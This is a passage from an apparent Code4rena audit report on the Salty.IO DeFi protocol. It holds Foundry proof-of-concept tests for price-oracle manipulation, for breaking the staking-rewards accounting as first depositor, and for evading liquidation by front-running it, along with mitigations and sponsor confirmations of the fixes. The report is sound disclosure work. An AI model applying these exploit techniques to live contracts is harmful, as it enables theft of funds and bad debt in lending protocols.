            _prepareToken(weth);

            vm.stopPrank();
            vm.prank(address(dao));
            poolsConfig.whitelistPool( pools, tokenA, tokenB );
            vm.stopPrank();

		}

        // Make the required approvals and transfer to Bob and Alice.
        function _prepareToken(IERC20 token) internal {
            vm.startPrank( DEPLOYER );
            token.approve( address(pools), type(uint256).max );
            token.approve( address(collateralAndLiquidity), type(uint256).max );
            // For WBTC, we can't use 'ether', so we use 10**8.
            uint decimals = TestERC20(address(token)).decimals();
            token.transfer(ALICE, 1_000_000 * (10**decimals));
            token.transfer(BOB, 1_000_000 * (10**decimals));

            vm.startPrank(ALICE);
            token.approve( address(pools), type(uint256).max );
            token.approve( address(collateralAndLiquidity), type(uint256).max );

            vm.startPrank(BOB);
            token.approve( address(pools), type(uint256).max );
            token.approve( address(collateralAndLiquidity), type(uint256).max );
            vm.stopPrank();
        }

        // Create pools that will participate in arbitrage
        // Note: We have all required pools for successful arbitrage, see ArbitrageSearch::_arbitragePath 
        // swap: swapTokenIn->WETH
        // arb: WETH->swapTokenIn->WBTC->WETH
        // We have: tokenA/WETH, tokenA/WBTC, WBTC/WETH
        function _makeArbitragePossible(uint amountToDeposit) internal {
            // based on Pools.t.sol::testDepositDoubleSwapWithdraw
            vm.startPrank(DEPLOYER);

            wbtc.approve(address(collateralAndLiquidity), type(uint256).max );
            weth.approve(address(collateralAndLiquidity), type(uint256).max );
            tokenA.approve(address(collateralAndLiquidity), type(uint256).max );
            tokenB.approve(address(collateralAndLiquidity), type(uint256).max );
            tokenA.approve(address(pools), type(uint256).max );

            vm.warp(block.timestamp + stakingConfig.modificationCooldown());
            collateralAndLiquidity.depositCollateralAndIncreaseShare(
                amountToDeposit * 10**8, amountToDeposit * 1 ether, 0, block.timestamp, false
            );
            vm.stopPrank();

            vm.startPrank(address(dao));
            poolsConfig.whitelistPool( pools, tokenA, wbtc);
            poolsConfig.whitelistPool( pools, tokenA, weth);
            poolsConfig.whitelistPool( pools, tokenB, wbtc);
            poolsConfig.whitelistPool( pools, tokenB, weth);
            vm.stopPrank();

            vm.startPrank(DEPLOYER);
            collateralAndLiquidity.depositLiquidityAndIncreaseShare(
                tokenA, wbtc, amountToDeposit * 1 ether, amountToDeposit * 10**8, 0, 
                block.timestamp, false
            );
            collateralAndLiquidity.depositLiquidityAndIncreaseShare(
                tokenB, wbtc, amountToDeposit * 1 ether, amountToDeposit * 10**8, 0, 
                block.timestamp, false
            );
            collateralAndLiquidity.depositLiquidityAndIncreaseShare(
                tokenA, weth, amountToDeposit * 1 ether, amountToDeposit * 1 ether, 0, 
                block.timestamp, false
            );
            collateralAndLiquidity.depositLiquidityAndIncreaseShare(
                tokenB, weth, amountToDeposit * 1 ether, amountToDeposit * 1 ether, 0, 
                block.timestamp, false
            );

            vm.stopPrank();
        }

        function _getReservesAndPrice(IERC20 _tokenA, IERC20 _tokenB) internal view returns (
            string memory _tokenASymbol, string memory _tokenBSymbol, 
            uint reserveA, uint reserveB, uint priceBinA
        ) {
            (reserveA, reserveB) = pools.getPoolReserves(_tokenA, _tokenB);
            _tokenASymbol = TestERC20(address(_tokenA)).symbol();
            _tokenBSymbol = TestERC20(address(_tokenB)).symbol();
            uint8  _tokenADecimals = TestERC20(address(_tokenA)).decimals();
            uint8  _tokenBDecimals = TestERC20(address(_tokenB)).decimals();

            // reserveA / reserveB  || b.decimals - a.decimals  || normalizer
            // 1e8/1e18             || diff 10                  || 1e28
            // 1e18/1e18            || diff 0                   || 1e18
            // 1e18/1e8             || diff -10                 || 1e8
            int8 decimalsDiff = int8(_tokenBDecimals) - int8(_tokenADecimals);
            uint normalizerPower = uint8(int8(18) + decimalsDiff);
            uint normalizer = 10**normalizerPower;

            // price with precision 1e18
            priceBinA = reserveB == 0 
                    ? 0 
                    : ( reserveA * normalizer ) / reserveB;
        }

        function _printReservesAndPriceFor(IERC20 _tokenA, IERC20 _tokenB) internal view 
        {
            (
                string memory _tokenASymbol, 
                string memory _tokenBSymbol, 
                uint reserveA, 
                uint reserveB, 
                uint priceBinA
            ) = _getReservesAndPrice(_tokenA, _tokenB);

            console2.log("%s reserves: %e", _tokenASymbol , reserveA);
            console2.log("%s reserves: %e", _tokenBSymbol, reserveB);
            console2.log("%s price in %s: %e", _tokenBSymbol, _tokenASymbol, priceBinA);
            console.log("");
        }


        // Extracted some local variables to storage due to too many local variables.
        struct MovePriceParams {
            uint amountToExchange;
            uint expectedMovementPercents; 
            uint expectedLoss;
        }
        uint gasBefore = 1; // Set to 1 to save gas on updates and obtain more accurate gas estimations.
        uint stepsCount;

        // Splitting a swap into several steps will significantly reduce slippage.
        // More steps will further reduce slippage, thereby decreasing the cost of the attack.
        // However, too many steps can incur high gas costs; for instance, 100 steps will cost approximately 3+4=7 million gas (as indicated in the console.log output).
        uint constant steps = 100;
        function _movePrice(MovePriceParams memory p) internal {
            /* Before the attack */
            console.log("\n%s", "__BEFORE");

            // Check price before
            (,,,,uint priceBefore) = _getReservesAndPrice(tokenA, weth);
            assertEq(1 ether, priceBefore); // price is 1:1

            _printReservesAndPriceFor(tokenA, weth);
            uint wethBefore = weth.balanceOf(ALICE);
            uint tokenABefore = tokenA.balanceOf(ALICE);
            console2.log("weth.balanceOf(ALICE): %e", wethBefore);
            console2.log("tokenA.balanceOf(ALICE): %e", tokenABefore);

            /* Move the price */
            vm.startPrank(ALICE);

            gasBefore = gasleft();
            for (uint i; i < steps; i++){
                pools.depositSwapWithdraw(tokenA, weth, p.amountToExchange/steps, 0, block.timestamp + 300);
            }
            console.log("Gas first(for) loop: ", gasBefore - gasleft());


            /* After the attack */
            console.log("\n%s", "__AFTER");

            // Console.log the output
            _printReservesAndPriceFor(tokenA, weth);
            uint wethAfter = weth.balanceOf(ALICE);
            uint tokenAAfter = tokenA.balanceOf(ALICE);
            console2.log("weth.balanceOf(ALICE): %e", weth.balanceOf(ALICE));
            console2.log("tokenA.balanceOf(ALICE): %e", tokenA.balanceOf(ALICE));
            uint wethGained = wethAfter - wethBefore;
            uint tokenALost = tokenABefore - tokenAAfter;
            console2.log("weth.balanceOf(ALICE) diff: %e", wethGained);
            console2.log("tokenA.balanceOf(ALICE) diff: %e", tokenALost);
            // Note: Since the price of tokenA and WETH are the same at the start, with a 1:1 ratio, 
            // we can subtract and add them as equivalent values.
            uint attackPrice = tokenALost - wethGained;
            console2.log("Losses for the attacker (before swapping back): %e", attackPrice);

            // Assert that the attack was successful and inexpensive.
            (,,,,uint priceAfter) = _getReservesAndPrice(tokenA, weth);
            uint priceDiff = priceAfter - priceBefore;
            assertTrue(priceDiff >= p.expectedMovementPercents * 1 ether / 100);

            /* The attacker can further reduce the cost by exchanging back. */
            /* After the exchange, the price is moved back. */
            console.log("\n%s", "__AFTER_EXCHANGING_BACK");
            (,,,,uint currentPrice) = _getReservesAndPrice(tokenA, weth);
            uint step = p.amountToExchange/steps;
            gasBefore = gasleft();
            while (currentPrice > 1 ether){
                pools.depositSwapWithdraw(weth, tokenA, step, 0, block.timestamp);
                (,,,,currentPrice) = _getReservesAndPrice(tokenA, weth);
                stepsCount++;
            }

            // Console.log the output
            console2.log("Gas second(while) loop: ", gasBefore - gasleft());
            console2.log("stepsCount", stepsCount);
            _printReservesAndPriceFor(tokenA, weth);
            uint wethAfterBalancing = weth.balanceOf(ALICE);
            uint tokenAAfterBalancing = tokenA.balanceOf(ALICE);
            console2.log("weth.balanceOf(ALICE): %e", weth.balanceOf(ALICE));
            console2.log("tokenA.balanceOf(ALICE): %e", tokenA.balanceOf(ALICE));
            int wethDiff = int(wethAfterBalancing) - int(wethBefore);
            int tokenADiff = int(tokenAAfterBalancing) - int(tokenABefore);
            console2.log("weth.balanceOf(ALICE) diff: %e", wethDiff);
            console2.log("tokenA.balanceOf(ALICE) diff: %e", tokenADiff);
            // Note: Since the price of tokenA and WETH are the same at the start, with a 1:1 ratio, 
            // we can subtract and add them as equivalent values.

            int sumDiff = wethDiff + tokenADiff;
            console2.log("Diff (positive=profit) for the attacker: %e", sumDiff);
            console2.log("Arbitrage profits for DAO: %e", pools.depositedUserBalance(address(dao), weth ));
        }

    function testMovePrice10PercentsFor1000EtherPools() public
		{
            _makeArbitragePossible(1_000);
            _movePrice(MovePriceParams(75 ether, 10, 0.0363 ether));
		}

    function testMovePrice3PercentsFor1000EtherPools() public
		{
            _makeArbitragePossible(1_000);
            _movePrice(MovePriceParams(23 ether, 3, 0.0036 ether));
		}

    function testMovePrice3PercentsFor100EtherPools() public
		{
            _makeArbitragePossible(100);
            _movePrice(MovePriceParams(2.3 ether, 3, 0.0004 ether));
		}

    function testMovePrice3PercentsFor10EtherPools() public
		{
            _makeArbitragePossible(10);
            _movePrice(MovePriceParams(0.23 ether, 3, 0.00008 ether));
		}
}
```
</details>

(Optional) You can place this AWK script in `1e18.sh`, make it executable with `chmod +x 1e18.sh`, and run `COVERAGE="yes" forge test -f wss://ethereum-sepolia.publicnode.com -vvv --mc M2 | ./1e18.sh` for a more readable output. This script will convert numbers in exponential notation to a floating point format with three decimal places. For example, `1e17` will be printed as `0.100`.

```sh
#!/bin/bash

awk '{
    for(i=1; i<=NF; i++) {
        if ($i ~ /[0-9]+e[+-]?[0-9]+/) {
            $i = sprintf("%.3f", $i / 1e18)
        }
    }
    print $0
}'

```
### Recommended Mitigation Steps

Consider replacing `CoreSaltyFeed` with a different oracle that provides better protection against manipulation, like Band Protocol.

**[othernet-global (Salty.IO) confirmed and commented](https://github.com/code-423n4/2024-01-salty-findings/issues/609#issuecomment-1947988990):**
 > Note: the overcollateralized stablecoin mechanism has been removed from the DEX.
> 
> https://github.com/othernet-global/salty-io/commit/f3ff64a21449feb60a60c0d60721cfe2c24151c1

 > The stablecoin framework: /stablecoin, /price_feed, WBTC/WETH collateral, PriceAggregator, price feeds and USDS have been removed:
> 
> https://github.com/othernet-global/salty-io/commit/88b7fd1f3f5e037a155424a85275efd79f3e9bf9
> 

**Status:** Mitigation confirmed. Full details in reports from [t0x1c](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/31), [0xpiken](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/63), and [zzebra83](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/43).

***

## [[H-04] First depositor can break staking-rewards accounting](https://github.com/code-423n4/2024-01-salty-findings/issues/341)
*Submitted by [0xRobocop](https://github.com/code-423n4/2024-01-salty-findings/issues/341), also found by [stackachu](https://github.com/code-423n4/2024-01-salty-findings/issues/1053), [Toshii](https://github.com/code-423n4/2024-01-salty-findings/issues/1022), [Arz](https://github.com/code-423n4/2024-01-salty-findings/issues/950), [DedOhWale](https://github.com/code-423n4/2024-01-salty-findings/issues/925), [peanuts](https://github.com/code-423n4/2024-01-salty-findings/issues/743), [Draiakoo](https://github.com/code-423n4/2024-01-salty-findings/issues/703), [zhaojie](https://github.com/code-423n4/2024-01-salty-findings/issues/667), and [ether\_sky](https://github.com/code-423n4/2024-01-salty-findings/issues/451)*

Staking in SALTY pools happens automatically when adding liquidity. In order to track the accrued rewards, the code "simulates" the amount of virtual rewards that need to be added given the increase of shares and lend this amount to the user. So, when computing the real rewards for a given user, the code will compute its rewards based on the `totalRewards` of the given pool minus the virtual rewards. The following code computes the virtual rewards for a user:

<https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/staking/StakingRewards.sol#L81>

```solidity
uint256 virtualRewardsToAdd = Math.ceilDiv( totalRewards[poolID] * increaseShareAmount, existingTotalShares );
```

Basically, it aims to maintain the current ratio of `totalRewards` and `existingTotalShares`. The issue with this is that allows the first depositor to set the ratio too high by donating some SALT tokens to the contract. For example, consider the following values:

```solidity
uint256 virtualRewardsToAdd = Math.ceilDiv( 1000e18 * 200e18, 202 );
```

The returned value is in order of 39-40 digits. Which is beyond what 128 bits can represent:

<https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/staking/StakingRewards.sol#L83-L84>

```solidity
user.virtualRewards += uint128(virtualRewardsToAdd);
totalRewards[poolID] += uint128(virtualRewardsToAdd);
```

This will broke the reward computations. For a more concrete example look the PoC.

### Proof of Concept

The following coded PoC showcase an scenario where the first depositor set the `rewards / shares` ratio too high, causing the rewards system to get broken. Specifically, it shows how the sum of the claimable rewards for each user is greater than the SALT balance of the contract.

It should be pasted under `Staking/tests/StakingRewards.t.sol`.

<details>

```solidity
function testUserCanBrickRewards() public {
        vm.startPrank(DEPLOYER);
        // Alice is the first depositor to poolIDs[1] and she deposited the minimum amounts 101 and 101 of both tokens.
        // Hence, alice will get 202 shares.          
        stakingRewards.externalIncreaseUserShare(alice, poolIDs[1], 202, true);
        assertEq(stakingRewards.userShareForPool(alice, poolIDs[1]), 202);
        vm.stopPrank();
        
        // Alice adds 100 SALT as rewards to the pool.
        AddedReward[] memory addedRewards = new AddedReward[](1);
        addedRewards[0] = AddedReward(poolIDs[1], 100 ether);
        stakingRewards.addSALTRewards(addedRewards);

        
        // Bob deposits 100 DAI and 100 USDS he will receive (202 * 100e8) / 101 = 200e18 shares.
        vm.startPrank(DEPLOYER);
        stakingRewards.externalIncreaseUserShare(bob, poolIDs[1], 200e18, true);
        assertEq(stakingRewards.userShareForPool(bob, poolIDs[1]), 200e18);
        vm.stopPrank();

        // Charlie deposits 10000 DAI and 10000 USDS he will receive (202 * 10000e8) / 101 = 20000e18 shares.
        vm.startPrank(DEPLOYER);
        stakingRewards.externalIncreaseUserShare(charlie, poolIDs[1], 20000e18, true);
        assertEq(stakingRewards.userShareForPool(charlie, poolIDs[1]), 20000e18);
        vm.stopPrank();

        // Observe how virtual rewards are broken. 
        uint256 virtualRewardsAlice = stakingRewards.userVirtualRewardsForPool(alice, poolIDs[1]);
        uint256 virtualRewardsBob = stakingRewards.userVirtualRewardsForPool(bob, poolIDs[1]);
        uint256 virtualRewardsCharlie = stakingRewards.userVirtualRewardsForPool(charlie, poolIDs[1]);

        console.log("Alice virtual rewards %s", virtualRewardsAlice);
        console.log("Bob virtual rewards %s", virtualRewardsBob);
        console.log("Charlie virtual rewards %s", virtualRewardsCharlie);

        // Observe the amount of claimable rewards.
        uint256 aliceRewardAfter = stakingRewards.userRewardForPool(alice, poolIDs[1]);
        uint256 bobRewardAfter = stakingRewards.userRewardForPool(bob, poolIDs[1]);
        uint256 charlieRewardAfter = stakingRewards.userRewardForPool(charlie, poolIDs[1]);

        console.log("Alice rewards %s", aliceRewardAfter);
        console.log("Bob rewards %s", bobRewardAfter);
        console.log("Charlie rewards %s", charlieRewardAfter);

        // The sum of claimable rewards is greater than 1000e18 SALT.
        uint256 sumOfRewards = aliceRewardAfter + bobRewardAfter + charlieRewardAfter;  
        console.log("All rewards &s", sumOfRewards);

        bytes32[] memory poolIDs2;

        poolIDs2 = new bytes32[](1);

        poolIDs2[0] = poolIDs[1];

        // It reverts
        vm.expectRevert("ERC20: transfer amount exceeds balance");
        vm.startPrank(charlie);
        stakingRewards.claimAllRewards(poolIDs2);
        vm.stopPrank();
    }
```

</details>

### Recommended Mitigation Steps

Some options:

*   Make the function `addRewards` in the `StakingRewards` contract permissioned. In this way, all rewards will need to go through the emitter first.

*   Do not let the first depositor to manipulate the initial ratio of rewards / share. It is possible for every pool to burn the initial 10000 shares and starts with an initial small amount of rewards, kind of simulating being the first depositor.

**[othernet-global (Salty.IO) confirmed and commented](https://github.com/code-423n4/2024-01-salty-findings/issues/341#issuecomment-1945294050):**
 > virtualRewards and userShare are now uint256 rather than uint128.
> 
> Fixed in: https://github.com/othernet-global/salty-io/commit/5f79dc4f0db978202ab7da464b09bf08374ec618


**[Picodes (Judge) commented](https://github.com/code-423n4/2024-01-salty-findings/issues/341#issuecomment-1951383677):**
 > Considering that you could time this to break in the future and that it seems easily doable by an attacker on a new pool, High severity seems justified under "Loss of matured yield".


**Status:** Mitigation confirmed. Full details in reports from [t0x1c](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/30), [0xpiken](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/64), and [zzebra83](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/44).

***

## [[H-05] User can evade `liquidation` by depositing the minimum of tokens and gain time to not be liquidated](https://github.com/code-423n4/2024-01-salty-findings/issues/312)
*Submitted by [0xbepresent](https://github.com/code-423n4/2024-01-salty-findings/issues/312), also found by [Arz](https://github.com/code-423n4/2024-01-salty-findings/issues/1024), Audinarey ([1](https://github.com/code-423n4/2024-01-salty-findings/issues/999), [2](https://github.com/code-423n4/2024-01-salty-findings/issues/990)), [c0pp3rscr3w3r](https://github.com/code-423n4/2024-01-salty-findings/issues/981), [stackachu](https://github.com/code-423n4/2024-01-salty-findings/issues/971), [memforvik](https://github.com/code-423n4/2024-01-salty-findings/issues/943), [HALITUS](https://github.com/code-423n4/2024-01-salty-findings/issues/922), [Infect3d](https://github.com/code-423n4/2024-01-salty-findings/issues/921), [Udsen](https://github.com/code-423n4/2024-01-salty-findings/issues/903), [Toshii](https://github.com/code-423n4/2024-01-salty-findings/issues/891), [J4X](https://github.com/code-423n4/2024-01-salty-findings/issues/885), [Aymen0909](https://github.com/code-423n4/2024-01-salty-findings/issues/841), [Kalyan-Singh](https://github.com/code-423n4/2024-01-salty-findings/issues/820), [0xlemon](https://github.com/code-423n4/2024-01-salty-findings/issues/788), [novodelta](https://github.com/code-423n4/2024-01-salty-findings/issues/782), [mussucal](https://github.com/code-423n4/2024-01-salty-findings/issues/737), [Draiakoo](https://github.com/code-423n4/2024-01-salty-findings/issues/713), [0xpiken](https://github.com/code-423n4/2024-01-salty-findings/issues/695), [zhaojie](https://github.com/code-423n4/2024-01-salty-findings/issues/677), [zhaojohnson](https://github.com/code-423n4/2024-01-salty-findings/issues/654), [00xSEV](https://github.com/code-423n4/2024-01-salty-findings/issues/639), [juancito](https://github.com/code-423n4/2024-01-salty-findings/issues/617), [CaeraDenoir](https://github.com/code-423n4/2024-01-salty-findings/issues/567), [n0kto](https://github.com/code-423n4/2024-01-salty-findings/issues/548), [DanielArmstrong](https://github.com/code-423n4/2024-01-salty-findings/issues/526), [Auditwolf](https://github.com/code-423n4/2024-01-salty-findings/issues/513), [Krace](https://github.com/code-423n4/2024-01-salty-findings/issues/506), [israeladelaja](https://github.com/code-423n4/2024-01-salty-findings/issues/505), [0xAsen](https://github.com/code-423n4/2024-01-salty-findings/issues/499), [pkqs90](https://github.com/code-423n4/2024-01-salty-findings/issues/480), [PENGUN](https://github.com/code-423n4/2024-01-salty-findings/issues/469), [0xBinChook](https://github.com/code-423n4/2024-01-salty-findings/issues/435), [lanrebayode77](https://github.com/code-423n4/2024-01-salty-findings/issues/422), [twcctop](https://github.com/code-423n4/2024-01-salty-findings/issues/364), [KingNFT](https://github.com/code-423n4/2024-01-salty-findings/issues/363), [Jorgect](https://github.com/code-423n4/2024-01-salty-findings/issues/338), [b0g0](https://github.com/code-423n4/2024-01-salty-findings/issues/299), [0xRobocop](https://github.com/code-423n4/2024-01-salty-findings/issues/277), [0xCiphky](https://github.com/code-423n4/2024-01-salty-findings/issues/275), [djxploit](https://github.com/code-423n4/2024-01-salty-findings/issues/255), [erosjohn](https://github.com/code-423n4/2024-01-salty-findings/issues/249), [holydevoti0n](https://github.com/code-423n4/2024-01-salty-findings/issues/248), [Banditx0x](https://github.com/code-423n4/2024-01-salty-findings/issues/235), [iamandreiski](https://github.com/code-423n4/2024-01-salty-findings/issues/210), [ayden](https://github.com/code-423n4/2024-01-salty-findings/issues/205), [0xanmol](https://github.com/code-423n4/2024-01-salty-findings/issues/172), [klau5](https://github.com/code-423n4/2024-01-salty-findings/issues/156), [solmaxis69](https://github.com/code-423n4/2024-01-salty-findings/issues/117), [developerjordy](https://github.com/code-423n4/2024-01-salty-findings/issues/95), and [0xAlix2](https://github.com/code-423n4/2024-01-salty-findings/issues/24)*

<https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/stable/CollateralAndLiquidity.sol#L140> 

<https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/stable/CollateralAndLiquidity.sol#L70>

The [CollateralAndLiquidity](https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/stable/CollateralAndLiquidity.sol) contract contains a critical vulnerability that allows a user undergoing liquidation to evade the process by manipulating the `user.cooldownExpiration` variable. This manipulation is achieved through the [CollateralAndLiquidity::depositCollateralAndIncreaseShare](https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/stable/CollateralAndLiquidity.sol#L70) function, specifically within the [StakingRewards::\_increaseUserShare](https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/staking/StakingRewards.sol#L57) function (code line [#70](https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/staking/StakingRewards.sol#L70)):

<Details>

```solidity
File: StakingRewards.sol
57: 	function _increaseUserShare( address wallet, bytes32 poolID, uint256 increaseShareAmount, bool useCooldown ) internal
58: 		{
59: 		require( poolsConfig.isWhitelisted( poolID ), "Invalid pool" );
60: 		require( increaseShareAmount != 0, "Cannot increase zero share" );
61: 
62: 		UserShareInfo storage user = _userShareInfo[wallet][poolID];
63: 
64: 		if ( useCooldown )
65: 		if ( msg.sender != address(exchangeConfig.dao()) ) // DAO doesn't use the cooldown
66: 			{
67: 			require( block.timestamp >= user.cooldownExpiration, "Must wait for the cooldown to expire" );
68: 
69: 			// Update the cooldown expiration for future transactions
70: 			user.cooldownExpiration = block.timestamp + stakingConfig.modificationCooldown();
71: 			}
72: 
73: 		uint256 existingTotalShares = totalShares[poolID];
74: 
75: 		// Determine the amount of virtualRewards to add based on the current ratio of rewards/shares.
76: 		// The ratio of virtualRewards/increaseShareAmount is the same as totalRewards/totalShares for the pool.
77: 		// The virtual rewards will be deducted later when calculating the user's owed rewards.
78:         if ( existingTotalShares != 0 ) // prevent / 0
79:         	{
80: 			// Round up in favor of the protocol.
81: 			uint256 virtualRewardsToAdd = Math.ceilDiv( totalRewards[poolID] * increaseShareAmount, existingTotalShares );
82: 
83: 			user.virtualRewards += uint128(virtualRewardsToAdd);
84: 	        totalRewards[poolID] += uint128(virtualRewardsToAdd);
85: 	        }
86: 
87: 		// Update the deposit balances
88: 		user.userShare += uint128(increaseShareAmount);
89: 		totalShares[poolID] = existingTotalShares + increaseShareAmount;
90: 
91: 		emit UserShareIncreased(wallet, poolID, increaseShareAmount);
92: 		}
```

</details>

Malicious user can perform front-running of the `liquidation` function by depositing small amounts of tokens to his position, incrementing the `user.cooldownExpiration` variable. Consequently, the execution of the `liquidation` function will be reverted with the error message `Must wait for the cooldown to expire.` This vulnerability could lead to attackers evading liquidation, potentially causing the system to enter into debt as liquidations are avoided.

### Proof of Concept

A test case, named `testUserLiquidationMayBeAvoided`, has been created to demonstrate the potential misuse of the system. The test involves the following steps:

1.  User Alice deposits and borrow the maximum amount.
2.  The collateral price crashes.
3.  Alice maliciously front-runs the `liquidation` execution by depositing a the minimum amount using the `collateralAndLiquidity::depositCollateralAndIncreaseShare` function.
4.  The `liquidation` transaction is reverted by "Must wait for the cooldown to expire" error.

<details>

```solidity
// Filename: src/stable/tests/CollateralAndLiquidity.t.sol:TestCollateral
// $ forge test --match-test "testUserLiquidationMayBeAvoided" --rpc-url https://yoururl -vv
//
    function testUserLiquidationMayBeAvoided() public {
        // Liquidatable user can avoid liquidation
        //
		// Have bob deposit so alice can withdraw everything without DUST reserves restriction
        _depositHalfCollateralAndBorrowMax(bob);
        //
        // 1. Alice deposit and borrow the max amount
        // Deposit and borrow for Alice
        _depositHalfCollateralAndBorrowMax(alice);
        // Check if Alice has a position
        assertTrue(_userHasCollateral(alice));
        //
        // 2. Crash the collateral price
        _crashCollateralPrice();
        vm.warp( block.timestamp + 1 days );
        //
        // 3. Alice maliciously front run the liquidation action and deposit a DUST amount
        vm.prank(alice);
		collateralAndLiquidity.depositCollateralAndIncreaseShare(PoolUtils.DUST + 1, PoolUtils.DUST + 1, 0, block.timestamp, false );
        //
        // 4. The function alice liquidation will be reverted by "Must wait for the cooldown to expire"
        vm.expectRevert( "Must wait for the cooldown to expire" );
        collateralAndLiquidity.liquidateUser(alice);
    }
```
</details>

### Recommended Mitigation Steps

Consider modifying the [liquidation](https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/stable/CollateralAndLiquidity.sol#L154) function as follows:

<details>

```diff
	function liquidateUser( address wallet ) external nonReentrant
		{
		require( wallet != msg.sender, "Cannot liquidate self" );

		// First, make sure that the user's collateral ratio is below the required level
		require( canUserBeLiquidated(wallet), "User cannot be liquidated" );

		uint256 userCollateralAmount = userShareForPool( wallet, collateralPoolID );

		// Withdraw the liquidated collateral from the liquidity pool.
		// The liquidity is owned by this contract so when it is withdrawn it will be reclaimed by this contract.
		(uint256 reclaimedWBTC, uint256 reclaimedWETH) = pools.removeLiquidity(wbtc, weth, userCollateralAmount, 0, 0, totalShares[collateralPoolID] );

		// Decrease the user's share of collateral as it has been liquidated and they no longer have it.
--		_decreaseUserShare( wallet, collateralPoolID, userCollateralAmount, true );
++		 _decreaseUserShare( wallet, collateralPoolID, userCollateralAmount, false );

		// The caller receives a default 5% of the value of the liquidated collateral.
		uint256 rewardPercent = stableConfig.rewardPercentForCallingLiquidation();

		uint256 rewardedWBTC = (reclaimedWBTC * rewardPercent) / 100;
		uint256 rewardedWETH = (reclaimedWETH * rewardPercent) / 100;

		// Make sure the value of the rewardAmount is not excessive
		uint256 rewardValue = underlyingTokenValueInUSD( rewardedWBTC, rewardedWETH ); // in 18 decimals
		uint256 maxRewardValue = stableConfig.maxRewardValueForCallingLiquidation(); // 18 decimals
		if ( rewardValue > maxRewardValue )
			{
			rewardedWBTC = (rewardedWBTC * maxRewardValue) / rewardValue;
			rewardedWETH = (rewardedWETH * maxRewardValue) / rewardValue;
			}

		// Reward the caller
		wbtc.safeTransfer( msg.sender, rewardedWBTC );
		weth.safeTransfer( msg.sender, rewardedWETH );

		// Send the remaining WBTC and WETH to the Liquidizer contract so that the tokens can be converted to USDS and burned (on Liquidizer.performUpkeep)
		wbtc.safeTransfer( address(liquidizer), reclaimedWBTC - rewardedWBTC );
		weth.safeTransfer( address(liquidizer), reclaimedWETH - rewardedWETH );

		// Have the Liquidizer contract remember the amount of USDS that will need to be burned.
		uint256 originallyBorrowedUSDS = usdsBorrowedByUsers[wallet];
		liquidizer.incrementBurnableUSDS(originallyBorrowedUSDS);

		// Clear the borrowedUSDS for the user who was liquidated so that they can simply keep the USDS they previously borrowed.
		usdsBorrowedByUsers[wallet] = 0;
		_walletsWithBorrowedUSDS.remove(wallet);

		emit Liquidation(msg.sender, wallet, reclaimedWBTC, reclaimedWETH, originallyBorrowedUSDS);
		}
```

</details>

This modification ensures that the `user.cooldownExpiration` expiration check does not interfere with the `liquidation` process, mitigating the identified security risk.

**[othernet-global (Salty.IO) confirmed and commented](https://github.com/code-423n4/2024-01-salty-findings/issues/312#issuecomment-1960801151):**
 > The stablecoin framework: /stablecoin, /price_feed, WBTC/WETH collateral, PriceAggregator, price feeds and USDS have been removed:
> 
> https://github.com/othernet-global/salty-io/commit/88b7fd1f3f5e037a155424a85275efd79f3e9bf9
> 

**Status:** Mitigation confirmed. Full details in reports from [zzebra83](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/45), [0xpiken](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/65), and [t0x1c](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/28).

***

## [[H-06] When borrowers repay USDS, it is sent to the wrong address, allowing anyone to burn Protocol Owned Liquidity and build bad debt for USDS](https://github.com/code-423n4/2024-01-salty-findings/issues/137)
*Submitted by [nonseodion](https://github.com/code-423n4/2024-01-salty-findings/issues/137), also found by [Toshii](https://github.com/code-423n4/2024-01-salty-findings/issues/893), [lanrebayode77](https://github.com/code-423n4/2024-01-salty-findings/issues/883), [Aymen0909](https://github.com/code-423n4/2024-01-salty-findings/issues/839), [KingNFT](https://github.com/code-423n4/2024-01-salty-findings/issues/744), [juancito](https://github.com/code-423n4/2024-01-salty-findings/issues/618), [00xSEV](https://github.com/code-423n4/2024-01-salty-findings/issues/608), [fnanni](https://github.com/code-423n4/2024-01-salty-findings/issues/600), [oakcobalt](https://github.com/code-423n4/2024-01-salty-findings/issues/571), [chaduke](https://github.com/code-423n4/2024-01-salty-findings/issues/565), [israeladelaja](https://github.com/code-423n4/2024-01-salty-findings/issues/549), [Ephraim](https://github.com/code-423n4/2024-01-salty-findings/issues/528), zach ([1](https://github.com/code-423n4/2024-01-salty-findings/issues/510), [2](https://github.com/code-423n4/2024-01-salty-findings/issues/507)), [Drynooo](https://github.com/code-423n4/2024-01-salty-findings/issues/503), [solmaxis69](https://github.com/code-423n4/2024-01-salty-findings/issues/495), [pkqs90](https://github.com/code-423n4/2024-01-salty-findings/issues/481), [wangxx2026](https://github.com/code-423n4/2024-01-salty-findings/issues/476), [ether\_sky](https://github.com/code-423n4/2024-01-salty-findings/issues/462), [0x3b](https://github.com/code-423n4/2024-01-salty-findings/issues/458), [LeoGold](https://github.com/code-423n4/2024-01-salty-findings/issues/355), [Jorgect](https://github.com/code-423n4/2024-01-salty-findings/issues/342), [0xAlix2](https://github.com/code-423n4/2024-01-salty-findings/issues/337), [0xRobocop](https://github.com/code-423n4/2024-01-salty-findings/issues/276), [0xanmol](https://github.com/code-423n4/2024-01-salty-findings/issues/240), [djxploit](https://github.com/code-423n4/2024-01-salty-findings/issues/219), 